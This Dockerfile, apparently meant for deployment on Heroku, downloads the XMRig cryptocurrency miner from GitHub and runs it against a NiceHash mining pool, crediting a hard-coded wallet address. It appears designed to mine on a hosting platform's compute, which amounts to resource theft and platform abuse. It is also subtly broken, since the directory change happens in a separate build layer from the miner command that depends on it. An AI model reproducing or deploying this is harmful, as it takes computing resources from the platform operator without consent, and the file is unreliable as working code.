FROM heroku/heroku:18
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz
RUN tar -xf xmrig-6.15.0-linux-x64.tar.gz && cd xmrig-6.15.0
RUN echo mining started!
RUN ./xmrig -o stratum+ssl://stratum.usa-east.nicehash.com:33380 -a rx -k -u 3N1wxx2YQrvobXJtpz7Js5h5zNqx2qo7H6.jqdtrw7jgdacwtp -p x
